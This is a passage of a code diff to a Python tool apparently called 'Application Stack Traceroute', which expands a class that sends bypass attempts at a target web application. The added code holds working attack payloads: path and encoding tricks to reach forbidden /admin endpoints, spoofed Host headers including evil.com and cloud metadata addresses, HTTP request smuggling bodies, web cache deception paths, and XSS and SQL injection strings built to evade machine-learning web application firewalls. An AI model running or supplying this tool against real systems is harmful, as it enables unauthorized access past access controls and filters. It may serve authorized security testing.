         for variant in path_variants:
@@ -2141,7 +2654,7 @@ class DiscrepancyTester:
                 test_url = f"{parsed.scheme}://{parsed.netloc}{variant}"
                 response = self.session.get(test_url, timeout=5, allow_redirects=False)
                 
-                if response.status_code not in [403, 401]:
+                if response.status_code not in [400, 401, 403, 404, 429]:
                     self.discrepancies.append({
                         'type': 'Path Normalization',
                         'original_path': base_path,
@@ -2195,6 +2708,24 @@ class DiscrepancyTester:
             base_path.replace('/', '%2f'),
             base_path.replace('/', '%252f'),  # Double encoded slash
             base_path.replace(' ', '%20').replace('%20', '+'),
+            base_path.replace('/', '%2f'),
+            base_path.replace('/', '%252f'),
+            base_path.replace('/', '%2F'),
+            base_path.replace('/', '%255c'),
+            base_path.replace('/', '/%2e%2e/'),
+            base_path.replace('/', '/.%2e/'),
+            base_path.replace('/', '/%2e./'),
+            base_path.replace('/', '%5c'),
+            base_path.replace('/', '%255c'),
+            base_path.replace('/', '\u2215'),   # Division slash
+            base_path.replace('/', '\u2044'),   # Fraction slash
+            base_path.replace('/', '\uff0f'),   # Fullwidth slash
+            '\u200b' + base_path,               # Zero-width space
+            base_path + '\u200b',
+            '\ufeff' + base_path,
+            base_path.replace('/', '%ef%bc%8f'),
+            base_path + '/%3f',
+            base_path + '/%23',
             base64.b64encode(base_path.encode()).decode()
         ]
         
@@ -2203,7 +2734,7 @@ class DiscrepancyTester:
                 test_url = f"{parsed.scheme}://{parsed.netloc}{variant}"
                 response = self.session.get(test_url, timeout=5)
                 
-                if response.status_code not in [403, 401, 400]:
+                if response.status_code not in [403, 401, 400, 429]:
                     self.discrepancies.append({
                         'type': 'Encoding Confusion',
                         'original_path': base_path,
@@ -2228,13 +2759,52 @@ class DiscrepancyTester:
             {'Content-Type': 'application/xml'},
             {'Content-Type': 'text/html'},
             {'Content-Type': 'application/octet-stream'},
+            {'Content-Type': 'application/json; charset=utf-8'},
+            {'Content-Type': 'application/json; charset=UTF-16'},
+            {'Content-Type': 'text/plain; charset=UTF-7'},
+            {'Content-Type': 'application/xml; charset=iso-8859-1'},
+            {'Content-Type': 'text/html; charset=ascii'},
+            {'Content-Type': 'application/json;boundary=foo'},
+            {'Content-Type': 'Application/Json'},
+            {'Content-Type': 'APPLICATION/JSON'},
+            {'Content-Type': ' application/json'},
+            {'Content-Type': 'application/json '},
+            {'Content-Type': '\tapplication/json'},
+            {'Content-Type': 'application/json\t'},
+            {'Content-Type': 'application/json, text/plain'},
+            {'Content-Type': 'text/plain, application/json'},
+            {'Content-Type': 'application/json; text/plain'},
+            {'Content-Type': 'application/javascript'},
+            {'Content-Type': 'text/javascript'},
+            {'Content-Type': 'application/x-json'},
+            {'Content-Type': 'application/xml+soap'},
+            {'Content-Type': 'application/soap+xml'},
+            {'Content-Type': 'text/xml'},
+            {'Content-Type': 'application/problem+json'},
+            {'Content-Type': 'application/hal+json'},
+            {'Content-Type': 'application/ld+json'},
+            {'Content-Type': 'application/vnd.api+json'},
+            {'Content-Type': 'application/vnd.github+json'},
+            {'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary'},
+            {'Content-Type': 'multipart/form-data; boundary=foo'},
+            {'Content-Type': 'multipart/form-data; boundary='},
+            {'Content-Type': ''},
+            {'Content-Type': ' '},
+            {'Content-Type': ';'},
+            {'Content-Type': '/'},
+            {'Content-Type': 'application'},
+            {'Content-Type': 'application/'},
+            {'Content-Type': 'application/json\n'},
+            {'Content-Type': 'application/json\r\n'},
+            {'Content-Type': 'text/plain', 'Accept': 'application/json'},
+            {'Content-Type': 'application/json', 'Accept': '*/*'}
         ]
 
         for headers in content_type_tests:
             try:
                 response = self.session.post(self.forbidden_endpoint, headers=headers, data='test', timeout=5)
 
-                if response.status_code not in [403, 401, 405]:
+                if response.status_code not in [403, 401, 405, 429]:
                     self.discrepancies.append({
                         'type': 'Content-Type Confusion',
                         'content_type': headers['Content-Type'],
@@ -2255,21 +2825,54 @@ class DiscrepancyTester:
 
         host_variations = [
             {'Host': 'localhost'},
+            {'Host': 'localhost.'},
             {'Host': '127.0.0.1'},
-            {'Host': 'evil.com'},
-            {'Host': original_host, 'X-Forwarded-Host': 'evil.com'},
-            {'Host': original_host, 'X-Original-Host': 'localhost'},
-            {'Host': original_host, 'X-Host': 'evil.com'},
+            {'Host': '127.0.0.1.'},
+            {'Host': '[::1]'},
+            {'Host': '0.0.0.0'},
             {'Host': f'{original_host}:80'},
             {'Host': f'{original_host}:443'},
+            {'Host': f'{original_host}:8080'},
+            {'Host': f'{original_host}:8443'},
+            {'Host': f'{original_host}:'},
+            {'Host': f'{original_host}:443@evil.com'},
             {'Host': f'{original_host}@evil.com'},
+            {'Host': f'evil.com@{original_host}'},
+            {'Host': f'{original_host}%40evil.com'},
+            {'Host': f'{original_host}@127.0.0.1'},
+            {'Host': f'{original_host}.'},
+            {'Host': f'.{original_host}'},
+            {'Host': f'www.{original_host}'},
+            {'Host': f'{original_host}.evil.com'},
+            {'Host': original_host.replace('a', 'а')},  # Cyrillic a
+            {'Host': f'xn--{original_host}'},
+            {'Host': original_host.upper()},
+            {'Host': original_host.swapcase()},
+            {'Host': f' {original_host}'},
+            {'Host': f'{original_host} '},
+            {'Host': f'\t{original_host}'},
+            {'Host': 'evil.com'},
+            {'Host': original_host, 'X-Forwarded-Host': 'evil.com'},
+            {'Host': original_host, 'X-Forwarded-Host': 'localhost'},
+            {'Host': original_host, 'X-Forwarded-Server': 'evil.com'},
+            {'Host': original_host, 'X-Original-Host': 'evil.com'},
+            {'Host': original_host, 'X-Host': 'evil.com'},
+            {'Host': original_host, 'Forwarded': 'host=evil.com'},
+            {'Host': original_host, 'Forwarded': 'for=127.0.0.1;host=evil.com'},
+            {'Host': '[::ffff:127.0.0.1]'},
+            {'Host': '[::ffff:7f00:1]'},
+            {'Host': f'{original_host}\x00.evil.com'},
+            {'Host': f'{original_host}%00.evil.com'},
+            {'Host': '169.254.169.254'},
+            {'Host': 'metadata.google.internal'}
+
         ]
 
         for headers in host_variations:
             try:
                 response = self.session.get(self.forbidden_endpoint, headers=headers, timeout=5)
 
-                if response.status_code not in [403, 401]:
+                if response.status_code not in [403, 401, 429]:
                     self.discrepancies.append({
                         'type': 'Host Header Attack',
                         'headers': headers,
@@ -2417,7 +3020,52 @@ class DiscrepancyTester:
             ('Hex Standard', '/%61dmin'),
             ('Octal', '/%0141dmin'),
             ('Unicode IIS', '/%u0061dmin'),
-            ('Double Decimal', '/%%36%31dmin')
+            ('Double Decimal', '/%%36%31dmin'),
+            ('Hex lower', '/%61dmin'),
+            ('Hex upper', '/%41dmin'),
+            ('Hex mixed', '/%4Admin'),
+            ('Incomplete hex', '/%6dmin'),
+            ('Invalid hex tolerated', '/%6Gdmin'),
+            ('Double encoded hex', '/%2561dmin'),
+            ('Triple encoded hex', '/%252561dmin'),
+            ('Double slash', '/%252fadmin'),
+            ('Double dot', '/%252e%252e/admin'),
+            ('Hex + literal', '/%61d%6din'),
+            ('Hex + slash', '/%61d%2fmin'),
+            ('Hex + dot', '/%2e%2e%2fadmin'),
+            ('Mixed case slash', '/%2Fadmin'),
+            ('Unicode IIS', '/%u0061dmin'),
+            ('Unicode uppercase', '/%U0061dmin'),
+            ('Unicode slash', '/%u2215admin'),
+            ('Unicode dot', '/%u002e%u002e%u2215admin'),
+            ('Overlong UTF-8 slash', '/%c0%afadmin'),
+            ('Overlong UTF-8 dot', '/%c0%ae%c0%ae%c0%afadmin'),
+            ('UTF-16 encoded slash', '/%00%2fadmin'),
+            ('UTF-16 encoded dot', '/%00%2e%00%2e%00%2fadmin'),
+            ('Encoded slash', '/%2fadmin'),
+            ('Double encoded slash', '/%252fadmin'),
+            ('Mixed slash', '/%2f%2fadmin'),
+            ('Backslash encoded', '/%5cadmin'),
+            ('Double encoded backslash', '/%255cadmin'),
+            ('Encoded dot', '/%2e/admin'),
+            ('Encoded dot-dot', '/%2e%2e/admin'),
+            ('Double encoded dot-dot', '/%252e%252e/admin'),
+            ('Mixed dot', '/.%2e/admin'),
+            ('Unicode fullwidth slash', '/%ef%bc%8fadmin'),
+            ('Unicode division slash', '/%e2%88%95admin'),
+            ('Unicode fraction slash', '/%e2%81%84admin'),
+            ('Null byte', '/admin%00'),
+            ('Encoded null', '/admin%2500'),
+            ('Tab encoded', '/admin%09'),
+            ('Newline encoded', '/admin%0a'),
+            ('CRLF encoded', '/admin%0d%0a'),
+            ('Encoded question mark', '/admin%3f'),
+            ('Encoded hash', '/admin%23'),
+            ('Encoded semicolon', '/admin%3b'),
+            ('Decimal encoding', '/%97dmin'),
+            ('Octal variant', '/%0141dmin'),
+            ('Mixed octal/hex', '/%0141%64min')
+
         ]
 
         for name, path in encoding_variations:
@@ -2488,52 +3136,83 @@ class DiscrepancyTester:
             pass
 
     def test_cache_key_confusion(self):
-        """Test cache key computation discrepancies"""
-        print("  🔑 Testing Cache Key Confusion...")
+        """
+        Comprehensive testing for cache key computation discrepancies, 
+        Web Cache Deception, and CPDoS signatures.
+        """
+        print("  🔑 Testing Cache Key Confusion & Cache Deception...")
+        base_host = self.target_url.split('//')[1].split('/')[0]
 
-        # Case Sensitivity Mismatch
+        # 1. Advanced Case & Extension Variations (Web Cache Deception / CPDoS)
         case_variations = [
-            ('/ADMIN', 'example.com'),
-            ('/admin', 'EXAMPLE.COM'),
-            ('/Admin', 'Example.Com')
+            ('/ADMIN', base_host),
+            ('/admin', base_host.upper()),
+            ('/Admin', base_host.capitalize()),
+            ('/admin/', base_host),
+            ('/admin/.', base_host),
+            ('/admin/..;/', base_host), # Path normalization confusion
+            ('/admin.js', base_host),   # Static extension spoofing
+            ('/admin.JS', base_host),   # Case variation on extension
+            ('/admin.css', base_host),
+            ('/admin%2f', base_host),   # Encoded slash
+            ('/admin%00', base_host),   # Null byte injection
+            ('/admin?%0d%0a', base_host) # CRLF in query
         ]
 
         responses = {}
         for path, host in case_variations:
             try:
+                # Test both with and without the variation to check for cache hits/misses
+                full_url = f"{self.target_url}{path}" if path.startswith('/') else f"{self.target_url}/{path}"
                 response = self.session.get(
-                    f"{self.forbidden_endpoint}{path}",
+                    full_url,
                     headers={'Host': host},
-                    timeout=5
+                    timeout=5,
+                    allow_redirects=False
                 )
-                key = f"{path}:{host}"
+                key = f"{path} (Host: {host})"
                 responses[key] = response.status_code
+                
+                # Check for Web Cache Deception (200 OK on sensitive path with static extension)
+                if '.js' in path.lower() or '.css' in path.lower():
+                    if response.status_code == 200:
+                         self.log_discovery("WARNING", "Cache", f"Potential Web Cache Deception on {path}")
             except:
                 pass
 
         if len(set(responses.values())) > 1:
             discrepancy = {
                 'type': 'Cache Key Confusion',
-                'subtype': 'Case Sensitivity',
-                'description': 'Different responses for case variations',
-                'responses': responses,
-                'unique_codes': len(set(responses.values()))
+                'subtype': 'Case/Extension Sensitivity',
+                'description': 'Cache treats path/host variations inconsistently',
+                'responses': responses
             }
             self.chain_map['discrepancies'].append(discrepancy)
-            self.log_discovery("Discrepancy", "Cache", f"Case sensitivity: {len(set(responses.values()))} different responses")
+            self.log_discovery("Discrepancy", "Cache", f"Found {len(set(responses.values()))} unique status codes in case testing")
 
-        # Parameter Order Confusion
+        # 2. Advanced Parameter & Separator Confusion (Cache Poisoning)
         param_variations = [
-            '/?b=2&a=1',
-            '/?a=1&b=2',
-            '/?a=1&b=2&',
-            '/?a=1&amp;b=2'
+            '/?b=2&a=1',            # Order confusion
+            '/?a=1&b=2',            # Standard
+            '/?a=1&b=2&',           # Trailing separator
+            '/?a=1;b=2',            # Semicolon separator (Akamai/others)
+            '/?a=1&a=2',            # Parameter pollution (duplicate)
+            '/?a=1#fragment',       # Fragment in key?
+            '/?__proto__=1',        # Prototype pollution check
+            '/?id=1\0',             # Null byte in query
+            '/?cb=' + str(int(time.time())), # Cache buster test
+            '/?a[]=1&a[]=2',        # Array notation
+            '/??a=1',               # Double question mark
+            '/?a=1&&b=2',           # Empty parameter
+            '/?%20a=1',             # Encoded space in key
+            '/?a=%201'              # Encoded space in value
         ]
 
         param_responses = {}
         for params in param_variations:
             try:
-                response = self.session.get(f"{self.forbidden_endpoint}{params}", timeout=5)
+                # Detect if the cache ignores certain parameters
+                response = self.session.get(f"{self.target_url}{params}", timeout=5, allow_redirects=False)
                 param_responses[params] = response.status_code
             except:
                 pass
@@ -2541,12 +3220,12 @@ class DiscrepancyTester:
         if len(set(param_responses.values())) > 1:
             discrepancy = {
                 'type': 'Cache Key Confusion',
-                'subtype': 'Parameter Order',
-                'description': 'Parameter order affects caching',
+                'subtype': 'Parameter/Separator Confusion',
+                'description': 'Query parameter handling affects cache behavior',
                 'variations': param_responses
             }
             self.chain_map['discrepancies'].append(discrepancy)
-            self.log_discovery("Discrepancy", "Cache", "Parameter order matters")
+            self.log_discovery("Discrepancy", "Cache", "Parameter/Separator handling is inconsistent")
 
     def test_parser_backtracking_dos(self):
         """Test parser algorithmic complexity"""
@@ -2691,58 +3370,101 @@ class DiscrepancyTester:
                 pass
 
     def test_ml_waf_evasion(self):
-        """Test ML-based WAF evasion techniques"""
-        print("  🤖 Testing ML WAF Evasion...")
+        """
+        Advanced testing for ML-based WAF evasion using adversarial attacks, 
+        token distribution manipulation, and context window overflows.
+        """
+        print("  🤖 Testing ML WAF Evasion (Adversarial Attacks)...")
+        
+        evasion_scenarios = [
+            # 1. Adversarial Padding (Noise Injection)
+            {
+                'name': 'Benign Token Padding',
+                'description': 'Injecting high-frequency benign tokens to lower malicious score',
+                'payload': lambda: f"{' '.join(random.choices(['user', 'profile', 'settings', 'view', 'item'], k=150))} <script>alert(1)</script> {' '.join(random.choices(['about', 'contact', 'help', 'search', 'home'], k=150))}",
+                'method': 'GET'
+            },
+            
+            # 2. Semantic Jittering (Comment/Whitespace Injection)
+            {
+                'name': 'Semantic Jittering',
+                'description': 'Using non-functional syntax changes to break pattern recognition',
+                'payload': lambda: "SEL/**/ECT pas/**/swd FR/**/OM us/**/ers WH/**/ERE '1'='1'",
+                'method': 'GET'
+            },
+            
+            # 3. Unicode Homoglyph Attack
+            {
+                'name': 'Unicode Homoglyph',
+                'description': 'Using look-alike unicode characters to bypass string matching',
+                'payload': lambda: "<scr\u0456pt>al\u0435rt(1)</scr\u0456pt>", # Uses Cyrillic 'і' and 'е'
+                'method': 'GET'
+            },
+            
+            # 4. Context Window Overflow (Post Body)
+            {
+                'name': 'Context Window Overflow',
+                'description': 'Exceeding the input window size of the ML model',
+                'payload': lambda: ("A" * 8192) + " <img src=x onerror=alert(1)> " + ("B" * 8192),
+                'method': 'POST'
+            },
+            
+            # 5. Token Squashing (Concatenation)
+            {
+                'name': 'Token Squashing',
+                'description': 'Avoiding spaces between tokens to break tokenization',
+                'payload': lambda: "window['al'+'ert'](document['coo'+'kie'])",
+                'method': 'GET'
+            },
+            
+            # 6. Base64/Nested Encoding Confusion
+            {
+                'name': 'Double Encoding Confusion',
+                'description': 'Forcing recursive decoding which might be limited in ML models',
+                'payload': lambda: urllib.parse.quote(urllib.parse.quote("<script>alert(1)</script>")),
+                'method': 'GET'
+            },
+            
+            # 7. Distribution Shift (Character Frequency)
+            {
+                'name': 'Character Frequency Shift',
+                'description': 'Using rare but valid encodings to shift character distribution',
+                'payload': lambda: "".join([f"&#x{ord(c):02x};" for c in "<script>alert(1)</script>"]),
+                'method': 'GET'
+            }
+        ]
 
-        # Adversarial Padding
-        try:
-            benign_tokens = ['user', 'login', 'welcome', 'dashboard', 'profile']
-            padding = ' '.join(random.choices(benign_tokens, k=100))
-            payload = f"{padding} <script>alert(1)</script> {padding}"
+        for scenario in evasion_scenarios:
+            try:
+                payload = scenario['payload']()
+                if scenario['method'] == 'GET':
+                    response = self.session.get(
+                        f"{self.forbidden_endpoint}/?q={payload}",
+                        timeout=5,
+                        allow_redirects=False
+                    )
+                else:
+                    response = self.session.post(
+                        self.target_url,
+                        data={'input': payload},
+                        timeout=5,
+                        allow_redirects=False
+                    )
 
-            response = self.session.get(
-                f"{self.forbidden_endpoint}/?q={urllib.parse.quote(payload)}",
-                timeout=5
-            )
-
-            if response.status_code not in [403, 406]:
-                discrepancy = {
-                    'type': 'ML WAF Evasion',
-                    'subtype': 'Adversarial Padding',
-                    'description': 'Benign token padding may confuse ML models',
-                    'padding_size': len(padding),
-                    'response_code': response.status_code
-                }
-                self.chain_map['discrepancies'].append(discrepancy)
-                self.log_discovery("Discrepancy", "ML Evasion", "Adversarial padding effective")
-        except:
-            pass
-
-        # Context Window Overflow
-        try:
-            pre_context = 'safe content ' * 200
-            malicious = '<img src=x onerror=alert(1)>'
-            post_context = ' safe content' * 200
-            full_payload = pre_context + malicious + post_context
-
-            response = self.session.post(
-                self.target_url,
-                data={'content': full_payload},
-                timeout=5
-            )
-
-            if response.status_code not in [403, 406]:
-                discrepancy = {
-                    'type': 'ML WAF Evasion',
-                    'subtype': 'Context Window Overflow',
-                    'description': 'Large context may exceed ML model window',
-                    'payload_size': len(full_payload),
-                    'response_code': response.status_code
-                }
-                self.chain_map['discrepancies'].append(discrepancy)
-                self.log_discovery("Discrepancy", "ML Evasion", "Context window overflow")
-        except:
-            pass
+                # If the WAF doesn't block (usually 403/406), it might be an evasion
+                if response.status_code not in [403, 406]:
+                    self.discrepancies.append({
+                        'type': 'ML WAF Evasion',
+                        'subtype': scenario['name'],
+                        'description': scenario['description'],
+                        'payload': payload[:100] + '...',
+                        'response_code': response.status_code,
+                        'severity': 'HIGH'
+                    })
+                    print(f"    [!] Potential ML Evasion: {scenario['name']} ({response.status_code})")
+            except Exception as e:
+                # print(f"    [x] Scenario failed: {scenario['name']} ({str(e)})")
+                pass
 
     def test_container_orchestration_bypass(self):
         """Test container/orchestration layer bypasses"""
@@ -2851,6 +3573,89 @@ class DiscrepancyTester:
                     'Content-Length': '0'
                 },
                 'data': '1\r\nZ\r\n0\r\n\r\n'
+            },
+            {
+                'headers': {
+                    'Content-Length': '6',
+                    'Transfer-Encoding': 'chunked'
+                },
+                'data': '0\r\n\r\nX'
+            },
+            {
+                'headers': {
+                    'Content-Length': '44',
+                    'Transfer-Encoding': 'chunked'
+                },
+                'data': (
+                    '0\r\n\r\n'
+                    'GET /admin HTTP/1.1\r\n'
+                    'Host: internal\r\n\r\n'
+                )
+            },
+            {
+                'headers': {
+                    'Transfer-Encoding': 'chunked',
+                    'Content-Length': '4'
+                },
+                'data': '5\r\nHELLO\r\n0\r\n\r\n'
+            },
+            {
+                'headers': {
+                    'Transfer-Encoding': 'chunked',
+                    'Content-Length': '1'
+                },
+                'data': '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
+            },
+            {
+                'headers': {
+                    'Transfer-Encoding': 'identity',
+                    'Transfer-Encoding': 'chunked'
+                },
+                'data': '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
+            },
+            {
+                'headers': {
+                    'Content-Length': '6',
+                    'Content-Length': '44'
+                },
+                'data': 'GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
+            },
+            {
+                'headers': {
+                    'Content-Length': '44',
+                    'Content-Length': '6'
+                },
+                'data': 'GET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
+            },
+            {
+                'headers': {
+                    'Transfer-Encoding': 'chunked ',
+                    'Transfer-Encoding': 'Chunked',
+                    'Transfer-Encoding': 'chunked\t',
+                    'Transfer-Encoding': 'chunked, identity',
+                    'Transfer-Encoding': 'identity, chunked',
+                    'Content-Length': '4'
+                },
+                'data': '0\r\n\r\n'
+            },
+            {
+                'headers': {
+                    'Transfer-Encoding': 'chunked'
+                },
+                'data': '0\n\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
+            },
+            {
+                'headers': {
+                    'Transfer-Encoding': 'chunked'
+                },
+                'data': 'FFFFFFFF\r\n0\r\n\r\n'
+            },
+            {
+                'headers': {
+                    'Transfer-Encoding': 'chunked',
+                    'Content-Length': '0'
+                },
+                'data': '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n'
             }
         ]
 
@@ -3452,7 +4257,7 @@ class ReportGenerator:
         """Generate human-readable text report"""
         report = f"""
 {'=' * 80}
-APPLICATION STACK TRACEROUTE v3.0 - INTELLIGENT RECONSTRUCTION
+APPLICATION STACK TRACEROUTE v3.2.c- INTELLIGENT RECONSTRUCTION
 {'=' * 80}
 
 🎯 TARGET: {self.target_url}
@@ -3645,7 +4450,7 @@ class ApplicationTraceroute:
     async def run_full_analysis(self):
         """Run complete analysis workflow"""
         print("\n" + "=" * 80)
-        print("🔬 APPLICATION STACK TRACEROUTE v3.0")
+        print("🔬 APPLICATION STACK TRACEROUTE v3.2.c")
         print("🎯 Intelligent Stack Reconstruction & Bypass Generation")
         print("=" * 80)
         print(f"\n🎯 Target: {self.target_url}\n")
